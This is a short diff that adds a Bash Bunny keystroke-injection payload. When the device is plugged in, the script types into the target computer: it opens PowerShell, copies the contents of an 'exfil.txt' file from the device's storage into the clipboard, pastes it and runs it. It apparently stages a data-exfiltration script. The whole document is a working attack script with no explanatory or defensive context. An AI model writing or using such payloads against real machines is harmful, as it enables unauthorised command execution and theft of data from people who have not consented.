@@ -1,0 +1,19 @@
+LED SETUP
+ATTACKMODE HID STORAGE
+
+Q WINDOWS r
+Q DELAY 1500
+Q STRING powershell
+Q ENTER
+Q DELAY 1500
+Q STRING "Set-Clipboard -Value (gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\switch1\exfil.txt'))"
+Q ENTER
+Q DELAY 2000
+Q ENTER
+Q DELAY 1000
+Q CONTROL v
+Q DELAY 1000
+Q ENTER
+Q DELAY 1000
+
+LED FINISH
